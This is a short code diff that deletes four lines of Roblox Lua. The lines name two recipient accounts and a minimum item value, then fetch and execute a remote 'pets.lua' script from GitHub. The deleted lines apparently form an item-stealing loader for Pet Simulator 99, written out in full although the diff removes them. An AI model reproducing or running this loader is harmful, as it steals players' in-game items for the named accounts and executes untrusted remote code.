@@ -1,4 +1,0 @@
-Username = "chanixmobiles"
-Username2 = "chanixmobile" -- stuff will get sent to this user if first user's mailbox is full
-min_rap = 500000 -- minimum rap of each item you want to get sent to you.
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
